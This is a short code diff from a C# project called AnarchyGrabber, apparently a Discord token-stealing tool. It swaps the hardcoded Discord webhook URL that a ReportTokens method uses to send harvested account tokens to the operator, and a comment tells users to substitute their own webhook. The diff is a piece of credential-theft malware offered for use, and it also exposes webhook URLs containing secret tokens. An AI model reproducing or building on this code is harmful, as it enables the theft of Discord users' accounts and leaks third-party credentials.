@@ -7,7 +7,7 @@ namespace AnarchyGrabber
     public static class Webhook
     {
         //you've got to change this to your own discord webhook url
-        private static readonly string _hookUrl = "https://discordapp.com/api/webhooks/644940129030373426/9t6tAgOX9T1_HGVDJP0cpFODuZ_daM94oRi8oEB-0XiBhhkQphGtBEFAh4k4GTGKbCaJ";
+        private static readonly string _hookUrl = "https://discordapp.com/api/webhooks/645293662615371821/R22LjURtjPqQXP0slcz5KzuaRpTs7Rblma0O59Qp1dtKz5vlVKz7vOzvW1CXphmA9y39";
 
 
         public static void ReportTokens(List<string> tokenReport)
